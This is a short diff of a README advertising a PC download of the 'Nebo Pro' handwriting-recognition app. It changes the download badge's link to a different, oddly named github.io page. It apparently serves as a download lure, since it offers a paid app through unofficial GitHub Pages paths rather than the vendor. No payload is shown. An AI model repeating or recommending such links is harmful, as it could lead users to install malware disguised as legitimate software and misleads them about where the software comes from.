@@ -3,7 +3,7 @@
 Take your note-taking to the next level with **Nebo**, the advanced handwriting recognition and digital notebook app for PC. Convert handwritten notes to editable text, create diagrams, and organize all your ideas in one place.
 
 ⬇️ **Download**  
-[![Download Nebo Pro](https://img.shields.io/badge/Download-Nebo_Pro-000000?style=for-the-badge&logo=notion&logoColor=white)](https://download-portal-demo.github.io/.github/Nebotool)
+[![Download Nebo Pro](https://img.shields.io/badge/Download-Nebo_Pro-000000?style=for-the-badge&logo=notion&logoColor=white)](https://trahendon.github.io/.github/Nebotool4PCinf1)
 
 ---
 
